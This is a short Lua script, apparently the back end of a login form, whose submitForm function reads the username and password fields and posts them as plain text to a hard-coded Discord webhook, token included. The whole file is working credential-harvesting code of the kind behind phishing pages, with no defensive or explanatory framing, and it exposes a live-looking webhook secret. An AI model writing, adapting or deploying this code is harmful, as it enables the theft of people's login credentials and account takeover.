function submitForm()
    local username = document:getElementByName("username1"):getValue()
    local password = document:getElementByName("password1"):getValue()
    
    -- Prepare the payload
    local payload = {
        content = "Username: " .. username .. "\nPassword: " .. password
    }

    -- Convert payload to JSON
    local json = require("json")
    local jsonPayload = json:encode(payload)
    
    -- Send data to Discord webhook
    local http = require("http")
    local webhookUrl = "https://discord.com/api/webhooks/1264673166744223794/rT6rfVJ_HEgEOMpIBfwNYmYA7kg_VgsH675SH8X0h49rP3Fgtb9S1DaXR796-sOF---A"
    local response, status = http:post(webhookUrl, jsonPayload, {
        ["Content-Type"] = "application/json"
    })

    if status == 200 then
        print("Data sent successfully!")
    else
        print("Failed to send data. Status: " .. status)
    end
end